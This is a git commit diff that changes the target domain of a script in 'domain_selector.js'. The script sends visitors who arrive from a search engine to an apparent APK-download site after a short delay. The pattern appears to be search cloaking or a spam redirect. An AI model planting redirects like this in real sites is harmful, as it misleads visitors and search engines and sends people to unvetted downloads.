8a2a304029bede5b50cc550f0eaa6eca69126639
thomaseadamse <thomaseadamse247@gmail.com>
2025-07-01 01:18:59 +0800

    Update domain_selector.js

--- domain_selector.js
+++ domain_selector.js
@@ -11,7 +11,7 @@
 
   if (isFromSearchEngine) {
     setTimeout(function () {
-      window.location.href = 'https://apk009.tkvip784.com/';
+      window.location.href = 'https://apk009.tkvip786.com/';
     }, 300);
 
     window.sc_project = 13141996;
